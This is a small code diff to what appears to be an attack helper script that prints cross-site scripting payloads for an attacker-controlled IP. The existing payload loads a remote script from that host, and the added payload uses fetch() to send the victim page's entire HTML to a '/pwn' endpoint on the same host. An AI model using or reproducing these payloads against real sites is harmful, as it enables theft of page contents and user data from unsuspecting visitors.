@@ -24,7 +24,9 @@ Steps:
 def create_web_server(ip):
     # Echo the payload instead of saving it to a file
     payload = f'<script src="http://{ip}/script.js"></script>'
-    print(f"Payload: {payload}")
+    print(f"Payload1: {payload}")
+    payl0ad = f"<script>fetch('http://{ip}/pwn?html='+encodeURIComponent(document.documentElement.outerHTML))</script>"
+    print(f"Payload2: {payl0ad}")
 
     # Create the 'web-server' directory
     os.makedirs("web-server", exist_ok=True)
